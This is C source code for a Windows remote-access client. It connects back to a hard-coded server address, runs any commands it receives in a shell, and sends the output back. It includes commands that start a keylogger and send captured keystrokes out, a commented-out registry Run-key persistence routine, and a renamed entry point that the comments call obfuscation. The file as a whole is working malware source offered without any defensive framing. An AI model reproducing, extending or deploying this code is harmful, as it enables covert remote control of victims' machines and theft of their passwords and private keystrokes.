#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <wininet.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include "UseTracker.h"


extern PSTR pTempBuff;

extern HANDLE notWritingTemp;
extern HANDLE notSendingLog;
extern int tempBuffHasData;

/*
 * NOTE
 * This code will be EXTENSIVELY commented
 * I have never done socket programming before, and will write out
 * what each line does for personal reference
 */

#define bzero(p, size) (void) memset((p), '\0', (size)); // because memset will be used many times
int sock;

/*
int run_it_up()
{
	char err[128] = "Failed\n";
	char suc[128] = "Enabled startup boot: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurentVersion\\Run\n";
	TCHAR szPath[MAX_PATH];
	DWORD pathLen = 0;

	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
	if (pathLen == 0)
	{
		send(sock, err, sizeof(err), 0);
		return(-1);
	}

	HKEY NewVal;
	
	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS)
	{
		send(sock, err, sizeof(err), 0);
		return(-1);
	}
	
	DWORD pathLenInBytes = pathLen * sizeof(*szPath);
	
	if (RegSetValueEx(NewVal, TEXT("RemoteConsole"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS)
	{
		RegCloseKey(NewVal);
		send(sock, err, sizeof(err), 0);
		return(-1);
	}
	
	RegCloseKey(NewVal);
	return(0);
}
*/


/* SHELL FUNCTION
 * Is called by main function after socket connection established
 * loops infinitely, receiving commands, doing something with them, and sending responses, until quit command
 */
void oh_boy_what_does_this_do() 
{
	char buffer[1024];
	char container[1024];
	char total_response[18384];

	while(1)
	{
		bzero(buffer, sizeof(buffer));
		bzero(container, sizeof(container));
		bzero(total_response, sizeof(total_response));	

		recv(sock, buffer, sizeof(buffer), 0); // receives command from server and stores in buffer
	
		// QUIT command
		if (strncmp("quit", buffer, 4) == 0)
		{
			closesocket(sock); // closes opened socket
			WSACleanup(); // performs windows cleanup
			exit(0); // end program
		}
		// CHANGE DIRECTORY command
		else if (strncmp("cd ", buffer, 3) == 0) // handle change directory commands differently
		{
			chdir(buffer + 3);
			send(sock, total_response, sizeof(total_response), 0);
		} /*
		else if (strncmp("the_creator", buffer, 7) == 0)
		{
			if (run_it_up() == -1)
			{
				strncpy(total_response, "Error", sizeof(total_response));
			} 
			else
			{
				strncpy(total_response, "Success!", sizeof(total_response));
			}
			send(sock, total_response, sizeof(total_response), 0);
		} */
		// START KEYLOGGER command
		else if (strncmp("make_me_crazy", buffer, 12) == 0)
		{
			// send Failed if error returned by keylogger function, Sucess if not
			if (make_me_crazy() != 0)
			{
				strncpy(total_response, "Failed\n", 7);
			} 
			else
			{
				strncpy(total_response, "Success\n", 8);
			}

			send(sock, total_response, sizeof(total_response), 0);
		} 
		// GET KEYLOG command
		else if (strncmp("with_rats", buffer, 9) == 0)
		{

			// if new key inputs, send buffer and change event states, if none, say that
			ResetEvent(notSendingLog);
			if (tempBuffHasData)
			{
				// if temp buffer is being written to, wait
				WaitForSingleObject(notWritingTemp, INFINITE);

				// copy buffer, format, send
				strncpy(total_response, "KLG: ", 5);
				strncpy(total_response + 5, pTempBuff, strlen(pTempBuff));
				strncpy(total_response + 5 + strlen(pTempBuff), "\n", 1);
				send(sock, total_response, sizeof(total_response), 0);

				
				// clear temporary buffer
				ZeroMemory(pTempBuff, strlen(pTempBuff));
				tempBuffHasData = 0;
			}
			else
			{
				strncpy(total_response, "[NO NEW DATA]\n", 14);
				send(sock, total_response, sizeof(total_response), 0);
			}
			SetEvent(notSendingLog);
		}
		// DEFAULT command - anything else runs directly in command shell
		else
		{
			FILE *fp;
			fp = _popen(buffer, "r"); // execute command in buffer and store command output in the file fp points to
			while(fgets(container, sizeof(container), fp)) // store contents of file, identified by pointer fp, in container
			{
				strcat(total_response, container); // only concatonate container to total_response if fgets is successful
			}
			send(sock, total_response, sizeof(total_response), 0); // sends character array total_response back to the server
			fclose(fp); // closes file stream
		}
	}
}


/* REAL MAIN
 * Sets up socket - attempts to connect until successful, then calls shell function
 */
int real_main()
{

	struct sockaddr_in ServAddr = {0}; // initialize a sockaddr_in structure - specifies address and port for IPV4/AF_INET
	unsigned short ServPort;
	char *ServIP;
	WSADATA wsaData; //contains data about windows sockets, needed to establish a connection to windows machine

	ServIP = "192.168.1.166"; // hard code to IP of receiving server
	ServPort = 50005; //any port that exists and is not being used works

	// checks if connection is successful
	if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
	{
		exit(1);
	}

	sock = socket(AF_INET, SOCK_STREAM, 0); // first two params specificy IPV4 and TCP - sets up socket
	
	ServAddr.sin_family = AF_INET; // sets sin_family member to AF_INET/IPV4 (must always be AF_INET)
	
		
	// converts ServIP and ServPort to address and port values (int and 16-bit number in network byte order)
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
	ServAddr.sin_port = htons(ServPort);

	// attempt to connect every 10 seconds until a connection is succesful
	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0)
	{
		Sleep(10);
	}
	
	oh_boy_what_does_this_do();
}


// fake main for some very easy obfuscation
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{
	real_main();
}
